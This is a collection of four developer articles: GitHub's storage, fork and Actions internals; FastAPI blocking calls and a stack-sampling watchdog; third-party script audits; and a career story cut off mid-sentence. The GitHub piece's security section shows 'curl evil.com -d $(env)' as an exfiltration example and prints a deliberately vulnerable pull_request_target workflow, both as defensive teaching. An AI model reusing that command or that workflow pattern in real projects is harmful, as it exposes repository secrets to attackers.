articles.title: GitHub Isn't Just a Remote Git Server: How Spoke Clusters, Fork Alternates, and Actions Runner Sandboxes Work Under the Hood
articles.description: A visual, 10-minute deep dive into GitHub distributed architecture. Learn how Spoke clusters replicate Git objects, how fork networks share terabytes via alternates, how secret refs/pull/ branches work, and how ephemeral Actions runners authenticate with keyless OIDC.
articles.body_html:
Ask most developers what GitHub is, and you will hear a deceptively straightforward answer:

"GitHub is a cloud hosting service for Git repositories with a web interface for code reviews and issue tracking."

If you only interact with GitHub through git push origin main and web pull requests, that description seems entirely accurate. You push your commits to a remote server, GitHub stores them, and your team inspects the diffs on a web page.

Yet running a platform that hosts over 100 million developers and more than 420 million repositories presents engineering hurdles that standard Git was never designed to handle:

  • What happens when 50,000 developers fork the Linux kernel or React? If GitHub stored 50,000 duplicate copies of a 4GB Git history, a single repository network would consume 200 terabytes of storage.
  • Git was written as a local command-line tool, not a distributed network database. How does GitHub prevent data loss when hard drives fail or servers crash mid-push?
  • How does GitHub compute whether a Pull Request can be merged without checking out files onto a disk?
  • How does GitHub Actions spin up millions of clean, isolated virtual machines every hour, execute untrusted user code, and allow workflows to authenticate with AWS and Google Cloud without storing a single static password?

GitHub is not a single server running git-daemon. It is an enormous, highly specialized distributed operating system.

Here is what actually happens under the hood across GitHub's infrastructure when you push code, open a pull request, and trigger an automated build.

1. The Git Storage Tier: How Spoke Clusters Shard the World

Standard Git relies on simple file system locking. When you push to a bare Git repository on an ordinary Linux server, Git runs git receive-pack. It checks if .git/refs/heads/main.lock exists, updates the reference, writes new packfiles, and releases the lock.

If two developers push simultaneously to the same branch on a standard Git server, one will fail. If the disk holding .git dies, your data is gone unless you have an offline backup.

To scale across hundreds of petabytes of Git data, GitHub built Spokes (formerly known as DGit, or Distributed Git).

The Three-Way Storage Quorum

In GitHub's architecture, repositories do not live on arbitrary file systems. They reside on dedicated, bare-metal storage servers called Spokes nodes.

Every repository is assigned to a cluster of three distinct Spokes file servers:

  • One Primary node
  • Two Replica nodes

When you run git push origin main, your traffic hits GitHub's edge network over HTTPS or SSH. GitHub's routing layer (the Spokes proxy) authenticates your session and routes your Git RPC traffic directly to the repository's active primary storage node.

The Atomic Two-Phase Write

To guarantee that your push never gets lost or split, Spokes coordinates writes using a two-phase transactional consensus protocol:

  1. Pre-Receive Validation: The primary node receives your incoming packfile over the network. It calculates the checksums and verifies that all referenced parent commits exist in the object graph.
  2. Parallel Replication: Before updating any branch pointers, the primary streams the raw packfile data simultaneously to the two replica nodes.
  3. Quorum Acknowledgment: Once at least two of the three nodes confirm they have written the objects to disk and verified their SHA integrity, the primary acquires the reference lock.
  4. Pointer Commit: The branch reference (e.g., refs/heads/main) is atomically updated across the quorum.
  5. Success Response: Only after quorum is achieved does your local terminal print To github.com:user/repo.git [new branch].

If a hard drive explodes or a storage server loses power mid-push, the Spokes cluster detects the heartbeat failure within seconds. A replica with verified data is promoted to primary, a new third replica is provisioned in the background, and your repository remains online with zero data loss.

2. Fork Networks: The Magic of Git Object Alternates

Consider what happens when a popular open source repository goes viral.

A project like the Linux kernel contains over 1.2 million commits and consumes roughly 4.5 gigabytes of disk space. As of today, it has over 50,000 public forks on GitHub.

If GitHub treated every fork as an independent Git repository, storing those forks would require:

50,000 forks × 4.5 GB = 225,000 GB (225 Terabytes)

Multiply that across React, Kubernetes, TensorFlow, and VS Code, and GitHub's storage costs would be astronomical.

GitHub avoids this through an architectural concept called Fork Networks, powered by a low-level Git mechanism known as Object Alternates.

How objects/info/alternates Works

When you click the Fork button on GitHub, GitHub does not duplicate the project's gigabytes of Git objects.

Instead, GitHub provisions a lightweight namespace directory containing its own refs and configuration. Inside that fork's .git/objects/info/ folder, GitHub writes a single line to a file named alternates:

/data/repositories/root-network-storage/objects

This tells the Git runtime: Whenever you need an object (a blob, tree, or commit) that does not exist in this fork's local object folder, look inside the root network's shared object pool.

Shared Read Pool, Isolated Write Pool

Because Git objects are identified by immutable SHA cryptographic hashes, sharing them is completely safe:

  • Communal History: All 50,000 forks share one communal copy of the Linux kernel's historical commits, trees, and files. Storing the shared base costs 4.5 gigabytes total, not 225 terabytes.
  • Isolated Edits: When you push a new commit to your personal fork, GitHub writes the new blobs and commit objects exclusively into your fork's private storage partition.
  • Instant Forking: Forking a massive multi-gigabyte repository completes in less than one second because GitHub only creates database records and an alternates pointer.

This architecture reduces GitHub's total object storage footprint across open source ecosystems by more than 95 percent.

3. The Secret Anatomy of Pull Requests (refs/pull/)

Pull Requests are central to modern software development, yet standard Git has no native concept of a "Pull Request". In pure Git, you have branches, tags, and remotes, but there is no git pull-request command.

How does GitHub implement Pull Requests entirely within the boundaries of Git's data structures?

The answer lies in hidden reference namespaces.

The Hidden Pull Request Refs

Whenever a developer opens Pull Request #42 on your repository, GitHub's backend automatically creates two special Git references inside the repository:

  1. refs/pull/42/head: A direct pointer to the exact commit SHA at the tip of the contributor's feature branch (even if the branch lives in a completely different fork).
  2. refs/pull/42/merge: A synthetic merge commit created automatically by GitHub in the background.

Notice that these references begin with refs/pull/ rather than refs/heads/. By default, when you run git clone or git fetch, Git only downloads refs/heads/* and refs/tags/*. This is why you do not see hundreds of pull request branches cluttering your local git branch -a list.

Fetching Any Pull Request Locally Without Forking

Because these references exist in the Git object store, you can fetch and test any Pull Request on GitHub directly from your terminal, without visiting the contributor's fork:

# Fetch PR #42 into a new local branch named pr-42
$ git fetch origin pull/42/head:pr-42

# Switch to the branch and test the code locally
$ git checkout pr-42

You can even configure your local .git/config to fetch all pull requests automatically:

[remote "origin"]
    fetch = +refs/pull/*/head:refs/remotes/origin/pr/*

The Background Merge Worker

How does GitHub know if a Pull Request has conflicts before you click the merge button?

Every time a contributor pushes a new commit to a Pull Request, or whenever the base target branch (main) receives new commits, GitHub enqueues a background job.

This worker runs a low-level, in-memory 3-way merge between refs/pull/42/head and refs/heads/main.

  • If the merge completes cleanly without conflicts, the worker writes a new merge commit object to refs/pull/42/merge and displays a green "Merge pull request" button on the web interface.
  • If a conflict occurs, the worker marks the PR as conflicted, flags the specific overlapping files in the database, and disables the one-click merge button.

This automated background evaluation means GitHub never has to compute merge diffs synchronously when a reviewer loads the page.

4. GitHub Actions: Ephemeral Runners and Keyless OIDC

GitHub Actions is currently the most popular CI/CD engine in the world. It processes millions of workflow runs daily, executing tests, compiling binaries, and deploying to cloud infrastructure.

Yet executing user-submitted workflow scripts is inherently dangerous. A workflow can contain arbitrary bash commands, install custom binaries, or attempt to read memory.

How does GitHub isolate these workloads, and how do modern pipelines deploy to cloud providers without storing static API keys?

The Ephemeral Virtual Machine Sandbox

When your repository triggers a workflow run (e.g., on push or pull_request):

  1. Workflow Parsing: GitHub's workflow orchestrator reads .github/workflows/*.yml from the commit tree. It parses job dependencies, matrix configurations, and environmental conditions into a Directed Acyclic Graph (DAG) of execution steps.
  2. Ephemeral VM Provisioning: For hosted runners (ubuntu-latest), GitHub requests a clean virtual machine instance from a massive pool of pre-warmed Azure virtual machines.
  3. Execution: The runner agent receives the step instructions over a secure outbound websocket connection, checks out your code, and executes your steps inside a locked-down virtualized sandbox.
  4. Total Destruction: The instant your job finishes, regardless of whether it succeeded or failed, the virtual machine is completely terminated and destroyed. No disk state, cache files, or memory contents survive. Every job begins on a clean, pristine operating system.

Keyless Cloud Authentication via OIDC

Historically, deploying from CI/CD required generating a long-lived cloud credential (like an AWS Access Key ID and Secret Access Key) and pasting it into GitHub Repository Secrets.

If an attacker compromised the repository or discovered a secret exfiltration vulnerability, that static cloud key could grant indefinite access to production infrastructure.

Modern GitHub Actions eliminates static secrets through OpenID Connect (OIDC).

Instead of storing credentials, your workflow requests a short-lived, cryptographically signed JSON Web Token (JWT) directly from GitHub's internal token service:

# .github/workflows/deploy.yml
name: Deploy to AWS
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write # Mandatory for requesting the OIDC token
      contents: read
    steps:
      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubDeployRole
          aws-region: us-east-1

      - name: Deploy Application
        run: |
          aws s3 sync ./dist s3://my-production-app/

The Cryptographic Handshake

Here is how the authentication handshake executes in seconds:

  1. The runner requests an OIDC token from GitHub's token authority.
  2. GitHub generates a JWT signed with GitHub's private key. The token payload contains claims describing the repository, git ref, workflow name, and trigger event: 
   {
     "iss": "https://token.actions.githubusercontent.com",
     "sub": "repo:my-org/my-app:ref:refs/heads/main",
     "aud": "sts.amazonaws.com"
   }
  1. The runner presents this token to AWS Security Token Service (STS) or Google Cloud Workload Identity.
  2. AWS verifies GitHub's signature using GitHub's public cryptographic keys (published via standard OpenID configuration).
  3. If the role's trust policy matches the token's subject (repo:my-org/my-app:ref:refs/heads/main), AWS returns temporary, scoped credentials valid for 15 to 60 minutes.

No static keys exist. No credentials can be leaked. Even if someone inspects the runner's disk, the credentials expire automatically.

5. The Critical Security Trap: pull_request vs pull_request_target

While GitHub Actions provides powerful automation, one specific configuration misunderstanding has caused dozens of high-profile security breaches across major open source repositories.

That trap is the difference between pull_request and pull_request_target.

The Standard pull_request Trigger (Safe by Default)

When an outside contributor forks your open source repository and submits a pull request, a workflow triggered by on: pull_request executes under strict security boundaries:

  • It runs in the context of the fork.
  • The default GITHUB_TOKEN is strictly read-only.
  • Zero repository secrets are passed to the runner. secrets.PRODUCTION_API_KEY evaluates to empty string.

Even if an attacker writes malicious code into the pull request (e.g., adding curl evil.com -d $(env) to package.json), they cannot steal your secrets because no secrets exist in the execution environment.

The Dangerous pull_request_target Trap

To enable automated workflows that label issues or post comments on pull requests from forks, developers often switch to on: pull_request_target.

pull_request_target behaves fundamentally differently:

  • It executes in the context of the base target repository.
  • It has full access to repository secrets.
  • The GITHUB_TOKEN has read/write permissions.

The catastrophic mistake occurs when developers combine pull_request_target with an explicit checkout of the untrusted pull request code:

# DANGEROUS VULNERABILITY: Do NOT use this pattern
name: Build Pull Request
on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Checking out untrusted PR head in a privileged context!
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      # Attacker's code executes with access to production secrets!
      - run: npm install && npm test
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}

In this scenario, an attacker can fork your repository, alter package.json to exfiltrate environment variables, and submit a pull request. Because the workflow uses pull_request_target, GitHub runs the attacker's code inside an environment containing your production secrets.

The Secure Pattern

If you must run automated builds and tests on external code, use on: pull_request.

Reserve pull_request_target strictly for metadata operations that do not execute untrusted code:

# SECURE PATTERN: Uses pull_request_target only for metadata labeling
name: Label Pull Request
on:
  pull_request_target:
    types: [opened]

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5
        # Notice: No checkout of PR code!
        with:
          repo-token: ${{ secrets.GITHUB_TOKEN }}

The Mental Shift

The evolution of GitHub over the past fifteen years reflects a broader truth about modern software development:

Git was designed to manage files on a developer's laptop.

GitHub was designed to scale collaboration across the planet.

When you understand the architecture beneath the web interface:

  • You appreciate how Spoke clusters preserve your commits through transactional consensus and quorum replication.
  • You see how Object Alternates enable millions of forks without consuming petabytes of duplicate storage.
  • You can leverage hidden refs/pull/ namespaces to test and review pull requests directly from your terminal.
  • You can design secure, modern CI/CD pipelines using ephemeral runner sandboxes and keyless OIDC authentication.

How has your understanding of GitHub's internal architecture influenced how you manage your team's CI/CD security and repository workflows? Have you migrated away from long-lived cloud secrets to OIDC, or rescued a team from a pull_request_target injection vulnerability? Share your thoughts and experiences in the comments below.

articles.title: Changing def to async def let one blocking call freeze an entire FastAPI app
articles.description: The same requests.get was harmless in a def endpoint and froze the server in an async def one: an unrelated endpoint went from 1.6 ms to 34 seconds. Plus FastAPI's 40-thread cliff, why asyncio.to_thread barely helps CPU work, and a watchdog that names the blocking line.
articles.body_html:
Everyone who writes async Python has been told not to block the event loop. What I had never seen measured is how much damage one blocking call actually does, and the part of FastAPI's behaviour that decides whether a given blocking call does any damage at all.

The short version is that the same requests.get was completely harmless in a plain def endpoint and froze the entire server in an async def one. An unrelated endpoint that normally answers in 1.6 milliseconds took 34 seconds. The usual fixes have edges too: one of them stops working at exactly forty concurrent requests, and another barely helps at all.

The setup

Everything runs locally on Python 3.14.4, FastAPI 0.143.0, Starlette 1.7.0, uvicorn 0.54.0 and anyio 4.15.1, with uvicorn's default single worker and its default asyncio event loop.

A separate upstream service stands in for a slow third-party API: every request to it takes exactly one second. The app under test has a handful of endpoints that call it in different ways, plus a trivial one I use as a canary:

@app.get("/fast")
async def fast():
    return {"ok": 1}

@app.get("/sync_def")
def sync_def():
    return requests.get(UP).json()          # blocking client, plain def

@app.get("/async_blocking")
async def async_blocking():
    return requests.get(UP).json()          # same blocking client, async def

@app.get("/async_proper")
async def async_proper():
    return (await client.get(UP)).json()    # httpx.AsyncClient

The load generator runs twenty concurrent clients against one of the slow endpoints, and while they run it measures how long the trivial /fast endpoint takes to answer, probing it every fifty milliseconds. Each case runs for fifteen seconds, three times.

One keyword, a 20,000-fold slowdown

while 20 clients hit /fast median slow requests served in 15 s
nothing (baseline) 1.6 ms
async def + httpx 1.6 ms 320
plain def + requests 1.6 ms 320
async def + requests 34,130 ms 35

Three of those rows are indistinguishable. The fourth is a different server. In fifteen seconds of probing, /fast answered exactly once, and that one answer took 34 seconds to arrive. The slow endpoint itself managed 35 requests in the time the others managed 320, which is one per second: the server had become strictly sequential.

The difference between the second and third rows is the whole story. requests.get blocks the thread it runs on until the upstream answers. In an async def endpoint, that thread is the one running the event loop, so for that second nothing else on the server can make progress, not the other nineteen slow requests and not the trivial one either. Twenty clients each holding the loop for a second turns into a queue.

A plain def endpoint is different because FastAPI never runs it on the event loop. It sends it to a thread pool, and the loop carries on serving everything else while the thread waits. The identical blocking call is harmless there.

Which means the common refactor of adding async to an existing endpoint, without also changing every library it calls, makes it worse. The code reads as more modern and behaves like a server with one thread.

The thread pool has forty threads

Plain def endpoints being safe raised an obvious next question: safe up to what point? FastAPI's thread pool comes from anyio, and anyio's default limit is easy to check:

anyio default thread pool size (total_tokens): 40

So I held the slow def endpoint at different concurrency levels and measured a trivial def endpoint, one that does nothing except return a constant:

slow def requests in flight trivial def endpoint, median
20 1.9 ms
39 1.9 ms
40 890 ms
60 953 ms
100 1,955 ms

There is a cliff at exactly forty. Below it, nothing is affected. At forty, every thread is busy waiting on the upstream, so the trivial endpoint has to wait for one to come free, which takes up to a second. At a hundred it waits for two rounds, and the slow requests themselves go from one second to 2.1.

Run exactly at the boundary, the result was split. Two runs out of three showed the 890 ms median, and one showed 11.9 ms with a 914 ms worst case, depending on whether a thread happened to free up just as the probe arrived. Forty is where the behaviour changes, not a precise threshold you can sit on.

async def endpoints don't use the pool at all. With a hundred slow def requests in flight, /fast still answered in 1.6 ms.

If you have a lot of slow synchronous endpoints, the limit is adjustable at startup:

@asynccontextmanager
async def lifespan(app):
    anyio.to_thread.current_default_thread_limiter().total_tokens = 200
    yield

With 200, a hundred concurrent slow requests left the trivial endpoint at 1.8 ms, and 150 simultaneous one-second requests all finished in 1.28 seconds. Forty threads would have needed four rounds of a second each to get through the same 150, by arithmetic rather than measurement. Threads are not free, so this trades memory for headroom rather than solving anything, but it is a one-line change that removes a cliff.

The blocking call that doesn't look like one

Network calls are the obvious culprit. CPU work is the one nobody suspects. One endpoint serialised a 300,000-row list to JSON, which took about 117 ms, the kind of thing that looks fine in a profile of a single request:

clients hitting the JSON endpoint /fast median /fast p99
1 63–71 ms up to 108 ms
4 427–435 ms 891–932 ms

A single client serialising JSON made an unrelated endpoint forty times slower. Four of them made it 270 times slower. No network call involved, nothing that would show up in a review as obviously wrong.

Moving it to a thread barely helped

The standard advice for CPU work in async code is to push it off the loop with asyncio.to_thread. I tried that, alongside a process pool, with four clients each time:

where json.dumps runs /fast median, three runs JSON requests served
inline in async def 393, 396, 397 ms 120
asyncio.to_thread 292, 303, 315 ms 112
process pool 1.6, 1.6, 1.6 ms 365

The thread helped by about a quarter and served slightly fewer requests than doing the work inline. The reason is the global interpreter lock. This build of Python 3.14 still has one, and serialising Python objects needs it, so the event loop thread spends most of its time waiting for the lock to be handed back, which happens on a five-millisecond switch interval. Moving the work to another thread moved where it ran without moving who it competed with.

A process pool has its own interpreter and its own lock. /fast went straight back to 1.6 ms, and because four processes could now serialise in parallel, the endpoint served three times as many requests. The first call into the pool took half a second while the worker processes started, so I warmed it before measuring.

Python's free-threaded build should change the thread result, since it removes the lock that caused it. I did not test that, so I would not assume the table above holds there.

Finding the line that's doing it

asyncio has a debug mode that warns about slow callbacks. With PYTHONASYNCIODEBUG=1 it caught both stalls:

Executing <Task finished name='Task-11' coro=<RequestResponseCycle.run_asgi() done, ...> took 1.003 seconds
Executing <Task finished name='Task-13' coro=<RequestResponseCycle.run_asgi() done, ...> took 0.117 seconds

It tells you that something blocked and for how long. It names uvicorn's request handler as the culprit, because that is the task that was running, not your endpoint and certainly not the line. On an application with fifty endpoints, that warning tells you there is a problem without telling you where.

So I wrote a small watchdog. A coroutine on the event loop updates a timestamp every fifty milliseconds, and a separate thread watches that timestamp. If it stops moving for more than a quarter of a second, the loop is blocked, and the thread grabs the main thread's stack at that moment, while the blocking call is still on it:

def install(threshold=0.25, interval=0.05):
    loop, main_id, state = asyncio.get_running_loop(), threading.get_ident(), {"tick": time.monotonic()}

    async def heartbeat():
        while True:
            state["tick"] = time.monotonic()
            await asyncio.sleep(interval)

    def watch():
        reported = None
        while True:
            time.sleep(interval)
            stalled = time.monotonic() - state["tick"]
            if stalled > threshold and reported != state["tick"]:
                reported = state["tick"]
                stack = traceback.extract_stack(sys._current_frames()[main_id])
                mine = [f for f in stack if "site-packages" not in f.filename and "/lib/python" not in f.filename]
                f = (mine or stack)[-1]
                print(f"[watchdog] event loop blocked {stalled*1000:.0f} ms at "
                      f"{f.filename.split('/')[-1]}:{f.lineno} in {f.name}(): {f.line}", file=sys.stderr)

    loop.create_task(heartbeat())
    threading.Thread(target=watch, daemon=True).start()

Call it from your app's lifespan and it points straight at the problem:

[watchdog] event loop blocked 289 ms at app.py:35 in async_blocking(): return requests.get(UP, timeout=30).json()

The 289 ms is when it noticed, not how long the stall lasted, since it reports as soon as the threshold is crossed in order to catch the call in progress. The 117 ms JSON stall was below the quarter-second threshold and went unreported, which is the right behaviour but a reminder to pick the threshold for the latency you actually care about.

What I got wrong

Twice during this experiment I killed the shell I was working in. I stopped the app between runs with pkill -f "uvicorn app:app", and the pattern matched the shell's own command line, which contained the same text. I had already learned to write the pattern as [u]vicorn so that it cannot match itself, and it still happened, because the same script restarted the server a few lines later and that line contained the plain string. The bracket trick protects the pattern, not the rest of the script. Stopping and starting now happen in separate commands.

A smaller one: my first attempt to print anyio's thread limit was a one-liner with its logic folded into a conditional expression, and it printed an empty line. I rewrote it as three readable lines before trusting the number forty, since every conclusion in that section rests on it.

What to take from it

In FastAPI, check what a blocking library call is sitting inside before you worry about it. In a plain def endpoint it borrows a thread and the rest of the server carries on. In an async def endpoint it holds the whole server until it finishes. If you add async to an endpoint, every call inside it has to become async too, or you have made it worse.

Know the number forty. If your plain def endpoints can be slow, forty of them in flight at once will make even trivial def endpoints queue, and raising the anyio limit is a one-line change.

Treat CPU work as blocking, because it is. Serialising a large response blocked the loop as surely as a network call did, asyncio.to_thread barely helped under the GIL, and a process pool fixed it completely.

And when something is blocking and you cannot see what, asyncio's debug mode will confirm the stall but not its location. A watchdog that samples the stack while the loop is stuck will give you the file and the line.

articles.title: Your Marketing Site Has 40 Scripts. Which Ones Are Actually Worth Keeping?
articles.description: Third-party scripts are easy to accumulate on a marketing website. A site might start with GA4 for...
articles.body_html:
Third-party scripts are easy to accumulate on a marketing website. A site might start with GA4 for analytics, a cookie banner, and a chat widget.

A year or two later, the list can look very different.

There’s a tag manager, heatmaps, session recordings, A/B testing, ad pixels, a CRM integration, a chatbot, a scheduling tool, a consent platform, embedded videos, social widgets, product analytics, and other tools.

Each one had a reason to exist.

The problem is that the browser doesn't care why you added it.

It has to download, parse, and execute that code on a real visitor's device. Some third-party scripts consume CPU, compete for network resources, delay other work, or add work to the main thread. Chrome's performance guidance specifically calls out third-party code as a significant source of page-load and JavaScript costs.

And that creates a problem that has very little to do with whether your marketing team likes a particular tool.

The question is whether the tool still earns its place on the website.

TL;DR

Keep a third-party script when it has a clear business purpose, an identifiable owner, useful data or functionality, and a cost that makes sense for the pages where it runs.

Remove it when nobody can explain why it exists, nobody uses the data it collects, another tool already does the same job, or its performance and maintenance cost are greater than its value.

A practical way to evaluate every script is to ask:

  1. What does this script do?
  2. Who actually uses what it provides?
  3. Does it affect leads, conversions, analytics, customer experience, or another measurable business outcome?
  4. Does another tool already cover the same job?
  5. Does it need to load on every page?
  6. What does it cost in performance, privacy, maintenance, and reliability?
  7. Who owns it?

If you cannot answer those questions, the script deserves an audit.

Why Too Many Third-Party Scripts Become a Problem

Third-party code is common on modern marketing websites. Analytics platforms, advertising tools, chat systems, consent management, testing platforms, embedded content, and other services often depend on JavaScript loaded from an external domain.

That doesn't automatically make them bad.

A script that sends important conversion data to your analytics platform can be worth its cost. A consent-management platform may be essential for how your site handles tracking. A scheduling widget may directly support your sales process.

The problem starts when the list grows without anyone reviewing it.

A marketer adds a new tool for a campaign. A developer installs its snippet. Another team adds a heatmap tool six months later. A redesign introduces a second analytics implementation. An agency adds its own tracking script. The campaign ends, but the script stays.

Nothing looks broken.

The website still loads. The forms still work. The analytics dashboard still has numbers in it.

Meanwhile, the browser is doing more work every time someone visits the site.

Chrome's Lighthouse documentation notes that third-party scripts can significantly affect page performance, including the amount of work performed on the browser's main thread.

That matters even more on marketing websites because the third-party script list often grows through small, reasonable decisions rather than one obviously bad technical choice.

The result is script bloat.

And script bloat is difficult to spot when you look at each tool separately.

How to Find Every Third-Party Script on Your Website

Before deciding what stays and what goes, you need a complete inventory.

This sounds simple until you actually do it.

A script can be added directly to a page, injected through Google Tag Manager, loaded by a WordPress plugin, included by a Webflow integration, or introduced by another third-party tool. Looking at the page source alone may give you an incomplete picture.

For a proper audit, I would check the website from several angles.

Start with the browser

Open Chrome DevTools and go to Network.

Reload the page with the Network panel open, then filter by:

  • JS
  • Fetch/XHR
  • Img
  • Doc

The JavaScript filter is the obvious starting point, but don't stop there. A third-party tool may load JavaScript and then make additional requests through XHR or fetch.

Look at the domains making those requests.

You might find something you recognize immediately:

www.googletagmanager.com
www.google-analytics.com
connect.facebook.net
snap.licdn.com
static.hotjar.com

You may also find domains that mean nothing to you.

Those deserve investigation.

The goal at this stage isn't to decide whether a script is good or bad. You're building the inventory first.

Check your tag manager

If the site uses Google Tag Manager, open the container and review every tag.

Pay attention to:

  • tags that are still active
  • tags with unclear names
  • old campaign tags
  • duplicate analytics tags
  • tags firing on every page
  • tags that were created for a temporary campaign
  • tags owned by former employees or agencies

Check your CMS and plugins

If the website runs on WordPress or another CMS with integrations and plugins, check those too.

A plugin may inject tracking code without anyone adding a script manually.

This is one reason script audits should include the systems responsible for adding code, not just the code itself.

You may discover that the same service is being loaded through two different paths.

For example:

  • GA4 is configured directly in the CMS
  • another GA4 implementation exists in GTM
  • a plugin adds another tracking library
  • a custom script sends additional events

The result can be duplicate data and unnecessary browser work at the same time.

Measure the Cost of Third-Party Scripts

Once you have the inventory, measure the actual impact.

This is where Chrome DevTools and Lighthouse become useful. Core Web Vitals can also help you understand how performance issues affect the actual experience of visitors.

Lighthouse has a dedicated third-party summary that helps identify third-party resources and the amount of main-thread work associated with them.

You can also use Chrome DevTools to inspect individual requests and understand what happens when the page loads.

Look at:

  • request count
  • transferred size
  • resource size
  • loading time
  • JavaScript execution
  • main-thread activity
  • additional network requests
  • when the resource starts loading
  • whether it blocks or delays important work

Don't obsess over one number.

A 200 KB script isn't automatically worse than a 50 KB script. The smaller script could trigger several additional requests or perform expensive JavaScript work after it loads.

Likewise, a script that takes a little time to load may still provide significant business value.

The broader impact of website speed also matters when evaluating third-party code, especially on marketing sites where performance directly affects the user experience.

You're looking for the cost-to-value ratio.

Look for Duplicate Functionality

One of the easiest wins in a script audit is finding tools that overlap.

A growing marketing stack can accumulate several tools that solve almost the same problem.

For example, you might have:

  • GA4 for analytics
  • another product analytics platform
  • a heatmap tool
  • a session-recording tool
  • a CRO platform
  • a separate event-tracking solution

They aren't identical, but there may be significant overlap.

The same thing can happen with tracking.

You might find multiple systems tracking:

  • page views
  • form submissions
  • CTA clicks
  • video plays
  • conversions

That creates two problems.

First, you're paying for tools that may not all be necessary.

Second, your team can end up with several versions of the same event and different numbers in different dashboards.

That kind of inconsistency can make analytics harder to trust, especially when multiple tracking systems are collecting similar data.

The technical cleanup can be easy.

The organizational cleanup is usually harder.

Someone needs to decide which system is the source of truth for each type of data.

Do Third-Party Scripts Need to Load on Every Page?

This is one of the highest-value questions in the entire audit.

A tool can be useful without needing site-wide access.

Consider a scheduling widget.

If its only purpose is to let visitors book a call, loading it on every blog article may not make sense.

The same applies to:

  • calculators
  • interactive demos
  • chat tools
  • review widgets
  • embedded videos
  • campaign-specific tracking
  • product-specific functionality

A simple rule is useful here:

If a script only supports one type of page, try to load it only where that functionality is needed.

This can reduce unnecessary requests and JavaScript execution on pages that don't benefit from the tool.

It also makes the website easier to reason about.

When someone investigates a slow blog post six months from now, they won't have to wonder why it is loading a collection of sales and product widgets that have nothing to do with the article.

A Script Audit Should End With a Decision

Once you've collected the data, every script should have a clear status.

I like using five:

1. Keep

The script provides meaningful business value, and its cost is justified.

2. Optimize

The tool is valuable, but its loading behavior, implementation, or scope can be improved.

3. Restrict

The tool is useful only on certain pages, for certain users, or after a specific interaction.

4. Replace

The business needs the functionality, but another implementation may provide a better balance of functionality, reliability, and performance.

5. Remove

Nobody needs it, nobody owns it, or its value doesn't justify keeping it.

That final category is often smaller than people expect.

The goal of a good audit isn't to delete half the website.

It's to make sure every piece of third-party code has a reason, an owner, and an appropriate place in the user journey.

Consent Changes the Loading Strategy

Privacy and consent requirements add another layer to script management.

Not every tracking or marketing script should necessarily load in the same way for every visitor.

Depending on the jurisdiction, consent configuration, and purpose of the technology, some third-party scripts may need to wait until the appropriate consent has been given. Google's Consent Mode documentation explains how Google tags can adjust their behavior based on a user's consent choices.

That means your audit should document:

  • which scripts are strictly necessary
  • which require consent
  • what happens when consent is denied
  • whether the consent platform actually controls the scripts
  • whether tags can fire before the expected consent state
  • whether the implementation matches your organization's privacy requirements

This is another reason you shouldn't simply copy a list of scripts from one website to another.

The technical implementation and the privacy requirements need to be considered together.

A consent banner that exists visually while tracking scripts continue firing before the appropriate consent state isn't solving the underlying problem.

The Goal Isn't Fewer Scripts. It's a Website You Can Explain.

A marketing website can have dozens of integrations and still be well managed.

The problem isn't the number sitting in your inventory.

The problem is when nobody can explain what those scripts do, why they load, who owns them, or what would happen if they disappeared.

That's when your marketing stack starts becoming technical debt.

A good WebOps process gives every integration a purpose and a place.

It also gives the team a way to challenge old decisions.

A tool that made perfect sense two years ago may not make sense today. A campaign may have ended. A new platform may have replaced an old one. A feature may have moved into another part of the stack.

The website should evolve with those changes.

And that brings us to the simplest rule I use for third-party scripts:

If you can't explain the value, the owner, the scope, and the cost, it's time to investigate why the script is still there.

Frequently Asked Questions

How many third-party scripts should a marketing website have?

→ There is no universal number that defines a healthy website.

A site with 10 scripts can have serious performance or tracking problems, while another site with 30 or 40 can be well managed.

What matters is whether each script has a clear purpose, an owner, an appropriate loading scope, and a reasonable technical cost.

Focus on understanding and controlling the script stack instead of chasing a specific number.

Do third-party scripts slow down a website?

→ They can. Third-party scripts can add network requests, download JavaScript, consume CPU, execute code on the main thread, and trigger additional resources.

The actual impact depends on the service, how it is implemented, when it loads, and what it does after loading.

Tools such as Chrome DevTools and Lighthouse can help you identify which third-party resources are contributing to the work performed by the browser.

Should I remove Google Tag Manager to improve website performance?

→ Not automatically. Google Tag Manager is a container that can load many different tags, so the performance impact depends heavily on what you put inside it.

Removing GTM while leaving the underlying tracking requirements unresolved may simply move the problem somewhere else.

Audit the tags inside the container first. Remove unused tags, eliminate duplicate tracking, restrict tags to relevant pages, and review how non-critical tags are loaded.

Should every marketing script load on every page?

→ No. A script should generally load wherever its functionality or measurement is actually needed.

A scheduling tool may only be necessary on pages where visitors can book a meeting. A product demo widget may only belong on product pages. A campaign-specific tracking script may only be relevant during a particular campaign.

Reducing unnecessary site-wide loading can improve performance while keeping the functionality your marketing team actually needs.

How often should I audit third-party scripts?

→ For many B2B SaaS websites, a quarterly review is a sensible starting point.

You should also review the script inventory after major website changes, migrations, new marketing tools, tracking architecture changes, or campaigns that introduce temporary integrations.

The exact frequency depends on how quickly the website and marketing stack change.

Final Thoughts

Having less scripts in your marketing site shouldn’t be just a goal in itself. Your site must utilize a technology stack that your marketing team is familiar with and can justify.

Each and every third-party script must justify its right to exist through efficiency of its business function, prevail scope, and the known owner.

Next time you find dozens of third-party requests present in DevTools, don’t ask yourself how to get rid of them. Instead, try to find out which requests actually has the right to exist.

articles.title: From $0 to my first dev job in 6 months — no CS degree
articles.description: Six months ago I had $0 in the bank earmarked for this, no computer science degree, and a browser tab...
articles.body_html:
Six months ago I had $0 in the bank earmarked for this, no computer science degree, and a browser tab open on "how to become a developer." Last week I signed my first dev job offer.

I'm not writing this to sell you a bootcamp or a course — I bought neither. I'm writing it because almost everything I was told about how to get that first job turned out to be a distraction from the one thing that actually worked.

The thing that worked wasn't learning more. It was shipping.

What I thought the job was (and what it actually is)

For the first six weeks I did what everyone tells you to do. I watched courses. I did the exercises. I rewrote the todo app four times in four frameworks. I started — and this is the part that stings — a LeetCode streak, because someone on a forum said that's what "real" developers grind.

I was busy every single day and I was getting nowhere. Here's why, and it took me embarrassingly long to see it:

